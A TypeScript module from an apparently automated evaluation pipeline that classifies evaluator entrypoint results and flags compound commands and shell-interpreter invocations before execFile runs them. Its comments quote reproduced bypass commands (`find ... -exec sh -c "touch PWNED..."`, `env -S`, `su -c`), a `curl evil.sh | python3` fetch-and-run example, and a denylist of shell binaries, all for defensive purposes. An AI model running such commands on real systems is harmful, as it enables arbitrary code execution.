/**
 * Entrypoint-liveness classification.
 *
 * Reproduced 2026-08-13 (security-adversarial night, SCAN=redblue): running
 * `npx @metaharness/redblue <any subcommand>` — the exact command this repo's
 * own `dream.config.json` documents as the SCAN=redblue evaluator entrypoint —
 * exits 0 with zero bytes on both stdout and stderr, for every subcommand
 * tried. The package's CLI guards its dispatch with the classic ESM idiom
 * `import.meta.url === \`file://${process.argv[1]}\``, which fails once the
 * executable is reached through the symlink npm/npx always create for a
 * package's `bin` entry, so the dispatch body silently never runs. Exit 0 +
 * silence is indistinguishable from "ran clean, zero findings" to anything
 * that only checks the exit code — exactly what STEP 5-9 of the compiled
 * nightly prompt would otherwise do. Any evaluator entrypoint result should
 * route through here before the pipeline is allowed to record EVALUATED=yes.
 */

export interface ExecResult {
  code: number;
  stdout: string;
  stderr: string;
}

export type EntrypointVerdict = 'live' | 'suspicious-silent' | 'blocked' | 'stale-state';

export interface EntrypointCheck {
  verdict: EntrypointVerdict;
  code: number;
  reason: string;
}

// Reproduced 2026-09-02 (evaluation-adapters night, SCAN=flywheel,darwin): running
// `npx @metaharness/darwin evolve . --sandbox mock` twice in the same checkout — the
// exact baseline-then-candidate pattern STEP 5-9 of the compiled nightly prompt uses —
// fails the second time with exit 1 and `Error: darwin: autonomous or generated child
// id already exists: g1_v0`. The entrypoint is live; it is the target directory's
// `.metaharness/` working state (generation/child ids) that persisted from the first
// run and collided with the second. Left classified as generic `blocked`, this reads as
// an evaluator outage or a candidate regression — neither is true. A dedicated verdict
// keeps that distinction visible instead of forcing the pipeline to guess.
//
// Reproduced 2026-09-22 (evaluation-adapters night, SCAN=flywheel,darwin): this
// classifier is shared across every configured `evaluatorEntrypoints` value, not
// just darwin — `bench` (`npm test`), and any future `flywheel`/`redblue` entry,
// all route through the same function. The original pattern, bare `/already
// exists/i`, matches that generic English phrase anywhere in stderr, so an
// unrelated real failure whose message happens to contain it (e.g. a `bench`
// test asserting `user already exists`, or any other entrypoint's own
// unrelated "already exists" error) is silently reclassified from a genuine
// `blocked` failure into `stale-state` — telling the pipeline "not a broken
// entrypoint or a candidate regression, clear state and re-run" about a
// failure that is neither. Scoped to the actual darwin message shape
// (`child id already exists`, per the exact reproduction above) so only that
// specific, known collision is treated as benign leftover state; every other
// nonzero exit — darwin or not — still classifies as `blocked`.
const STALE_STATE_RE = /\bchild id already exists\b/i;

/**
 * Tokenize a command string into argv for `execFile` (no shell). Reproduced
 * 2026-08-17 (evaluation-adapters night, SCAN=flywheel,darwin): the only
 * existing way to run an `evaluatorEntrypoints` value is `verify-entrypoint
 * <label> --cmd "<command>"`, hand-retyped per entrypoint. Auto-feeding a
 * config-sourced command string into `child_process.exec` (a shell) would
 * let shell metacharacters in that string (`&&`, `;`, `|`, backticks) run as
 * shell operators, not literal argv text — safe only as long as a human
 * retypes each command by hand. This tokenizer is the safe alternative:
 * split on whitespace, honoring double-quoted segments as one token (minimal
 * quoting — sufficient for this repo's own `evaluatorEntrypoints` values;
 * single-quote/escaped-quote handling is a documented non-goal, not silently
 * mishandled). This is a *correctness* boundary, not a security one: because
 * `execFile` never involves a shell, a mis-split token can only make a
 * command fail or run a different-than-intended argv — it can never let a
 * shell metacharacter act as an operator. Known gaps, adversarially
 * reviewed 2026-09-17, not fixed (would need a real shell-lexer for input
 * this repo's own two configured entrypoints never produce): a
 * backslash-escaped quote (`echo "a\"b"`) does not unescape; a quote
 * embedded mid-token (`a"b c"d`) is not special, only a token that *starts*
 * with `"` is; a leading empty-quoted token (`'"" build'` → `['', 'build']`)
 * makes `verify-entrypoints` report "empty command" and silently drop the
 * real argument that followed it, instead of running `build`.
 */
export function tokenizeCommand(cmd: string): string[] {
  const tokens: string[] = [];
  const re = /"([^"]*)"|(\S+)/g;
  let m: RegExpExecArray | null;
  while ((m = re.exec(cmd)) !== null) {
    tokens.push(m[1] !== undefined ? m[1] : m[2]);
  }
  return tokens;
}

const SHELL_CONTROL_OPERATORS = new Set(['&&', '||', ';', '|', '&']);

/**
 * True if a tokenized command's argv contains a shell control operator as a
 * standalone token — i.e. the original string was actually multiple shell
 * commands chained together, not one command with arguments. Confirmed as a
 * real, live bug 2026-09-18 (PR #116 review, repo owner): this repo's own
 * `dream.config.json` darwin entry is exactly this shape — `rm -rf
 * .metaharness && npx @metaharness/darwin evolve . --sandbox mock`.
 * `tokenizeCommand` correctly never shell-interprets `&&` (it's just another
 * inert token, per `execFile`'s no-shell guarantee), but blindly dispatching
 * argv[0] as the executable and the rest as its args — the naive reading of
 * a tokenized command — silently misfires on a string like this: `rm`
 * becomes the executable, and `-rf .metaharness && npx @metaharness/darwin
 * evolve . --sandbox mock` (a bare `.` among them) becomes its argv. `npx`
 * never runs; `rm` runs instead, with garbage arguments including the
 * current directory. This check exists so `verify-entrypoints` can refuse
 * the whole entry instead of executing anything for it. Deliberately a
 * denylist of exact separator tokens (not a shell grammar) — matches this
 * module's own established minimal-quoting scope. Inherits tokenizeCommand's
 * whitespace-only splitting: an operator only counts if it is its own token
 * (`cmd1 ; cmd2`), not glued to a neighbor (`cmd1;cmd2`) — every
 * evaluatorEntrypoints value observed in this repo uses spaced operators.
 */
export function looksLikeCompoundCommand(argv: string[]): boolean {
  return argv.some((t) => SHELL_CONTROL_OPERATORS.has(t));
}

const SHELL_INTERPRETER_BASENAMES = new Set(['sh', 'bash', 'zsh', 'dash', 'ash', 'ksh']);

// Not shells themselves, but their own `-c` flag spawns one regardless (e.g.
// `su -c "..."` runs the target user's shell with `-c`). Round 3, see below.
const SHELL_SPAWNING_DASH_C_COMMANDS = new Set(['su']);

function basename(path: string): string {
  const slash = path.lastIndexOf('/');
  return slash === -1 ? path : path.slice(slash + 1);
}

/**
 * True if ANY position in argv names a shell interpreter followed somewhere
 * later by a literal `-c` token — e.g. `sh -c "echo a && echo b"` at argv[0],
 * or `sh` buried deeper in argv via a wrapper command.
 *
 * Live-reproduced 2026-10-18 (security-adversarial night, SCAN=redblue,
 * supply-chain): `execFile('sh', ['-c', 'echo A > f && echo B'])` really runs
 * `/bin/sh`, which really interprets `&&` as a shell operator — confirmed by
 * running `verify-entrypoints` against a real config entry of exactly this
 * shape, which wrote a file and ran a second statement. `execFile`'s "never
 * a shell" guarantee (the premise `looksLikeCompoundCommand` and the
 * `verify-entrypoints` trust-boundary comment both rest on) depends entirely
 * on *which binary* argv names — naming a shell itself with `-c` reproduces
 * full shell semantics despite `shell: true` never being set anywhere, and
 * `looksLikeCompoundCommand` cannot see it: `tokenizeCommand`'s own
 * double-quote handling (correctly) folds the whole `-c` payload into one
 * token, so none of `&&`/`;`/`|` ever appears as its own standalone argv
 * entry for that check to find.
 *
 * **Widened twice more same night, both BLOCKED rounds with a fresh
 * independent critic each time, each fix verified live**:
 *
 * Round 2: a first draft checked only argv[0]. The critic live-reproduced a
 * bypass that survives it: `find . -maxdepth 0 -exec sh -c "touch PWNED &&
 * echo pwned" {} +` — argv[0] is `find`, not a shell, so the argv[0]-only
 * check missed it, yet `find` itself spawns `/bin/sh -c '<payload>'`
 * internally and the payload really ran (confirmed live). The same class
 * applies to `xargs -I{} sh -c '...'`, GNU `parallel --exec`, `timeout`/
 * `nice`/`ssh host`/`docker run` wrapping a literal `sh -c`, or a `make` rule
 * under `SHELL=sh`. Fixed by scanning every argv position, not just argv[0].
 *
 * Round 3: a second, fresh critic (no context from round 2) live-reproduced
 * two more real bypasses of the round-2 fix: (a) `env -S "sh -c '...'"` —
 * GNU coreutils' `env -S`/`--split-string` word-splits its own argument into
 * a fresh argv and re-execs it, so the nested `sh -c` is hidden inside one
 * quoted token (the same quoting trick the original bug used, one level
 * deeper) — confirmed live, file written, `&&`'s second statement ran; (b)
 * `su -c "..."` — `su` is not a shell itself but its own `-c` flag spawns
 * the target user's shell with `-c`, independent of any shell basename —
 * confirmed live as root. Fixed: `su` added alongside the shell basenames
 * (identical detection — `-c` anywhere after it); `env -S`/`--split-string`'s
 * argument is recursively re-tokenized and re-scanned, since it is itself a
 * full nested command string, the same way the outer command is.
 *
 * Accepted, disclosed trade-off from round 2's widening: a command that
 * merely passes the literal strings `sh`/`bash`/etc. and `-c` as inert
 * arguments to an unrelated program (e.g. `echo sh -c`) now also blocks,
 * even though no shell is actually invoked — fail-closed, same posture this
 * module's sibling `looksLikeCompoundCommand` already accepts, and not a
 * shape any real `evaluatorEntrypoints`/`controlPlaneProbes` value in this
 * repo has ever used.
 *
 * **This is a denylist of known shell-spawning wrappers, not a closed set —
 * three rounds of independent critique each found a new one, and that
 * pattern should be expected to continue**: `fish`/`csh`/`tcsh` (not in
 * `SHELL_INTERPRETER_BASENAMES`, support `-c`, not live-tested — neither
 * binary exists in this sandbox), a combined flag (`-ic`), `env`'s glued
 * `--split-string=<value>`/`-SSTRING` forms (dropped deliberately: a quote
 * immediately after `=` is not at the very start of a whitespace-delimited
 * chunk, so `tokenizeCommand` itself already mis-splits it per that
 * function's own disclosed scope — live-confirmed it produces garbage
 * tokens, not a usable nested command string, so building a second parser
 * just for this one glued flag form would be its own source of bugs rather
 * than a real fix), a renamed/symlinked interpreter binary, and any future
 * tool with its own "run this string" flag are all known, disclosed,
 * NOT-fixed gaps — not silently assumed safe. `evaluatorEntrypoints`'
 * underlying trust boundary has never been "no command can misbehave"; it
 * is, and remains, "this value is repo-committed, PR-reviewed config, not
 * attacker-controlled at runtime" (stated in `index.ts`'s own comment at
 * this command's call site) — this function is defense-in-depth against a
 * malformed or careless config shape reaching a real shell by accident, not
 * a hard security boundary against a deliberately adversarial config author,
 * who could already run anything via a single well-formed command regardless
 * (e.g. `curl evil.sh | python3`, an already-acknowledged, unfixed-by-design
 * risk class — see `supplychain.ts`'s header comment for the same framing
 * applied to unpinned `npx`).
 */
export function invokesShellInterpreter(argv: string[]): boolean {
  for (let i = 0; i < argv.length; i++) {
    const name = basename(argv[i]);
    if ((SHELL_INTERPRETER_BASENAMES.has(name) || SHELL_SPAWNING_DASH_C_COMMANDS.has(name)) &&
        argv.slice(i + 1).includes('-c')) {
      return true;
    }
    if (name === 'env') {
      for (let j = i + 1; j < argv.length; j++) {
        // `--split-string=<value>` (no space before the quote) is deliberately not
        // handled: tokenizeCommand's own doc comment already discloses that a quote
        // embedded mid-token (not at the very start of a whitespace-delimited chunk)
        // is not special, so this glued form comes out of tokenizeCommand already
        // garbled — building a second, separate parser just for this one flag's glued
        // form would be its own source of bugs. Known, disclosed, not fixed.
        if (argv[j] === '-S' || argv[j] === '--split-string') {
          const nested = argv[j + 1];
          if (nested !== undefined && invokesShellInterpreter(tokenizeCommand(nested))) return true;
        }
      }
    }
  }
  return false;
}

/** Classify a completed entrypoint invocation. Pure — no I/O. */
export function classifyEntrypointResult(r: ExecResult): EntrypointCheck {
  if (r.code !== 0) {
    const stderr = r.stderr.trim();
    if (STALE_STATE_RE.test(stderr)) {
      return {
        verdict: 'stale-state',
        code: r.code,
        reason:
          `${stderr || `exited ${r.code} with no stderr`} — this looks like local state left over from a ` +
          "prior invocation (e.g. a working directory the tool doesn't reset itself), not a broken " +
          'entrypoint or a candidate regression. Clear that state and re-run before recording a verdict.',
      };
    }
    return {
      verdict: 'blocked',
      code: r.code,
      reason: stderr || `exited ${r.code} with no stderr`,
    };
  }
  if (r.stdout.trim() === '' && r.stderr.trim() === '') {
    return {
      verdict: 'suspicious-silent',
      code: r.code,
      reason:
        'exit 0 with empty stdout and stderr — indistinguishable from "ran clean, zero findings"; ' +
        'do not record EVALUATED=yes from this result alone',
    };
  }
  return { verdict: 'live', code: r.code, reason: 'produced output' };
}
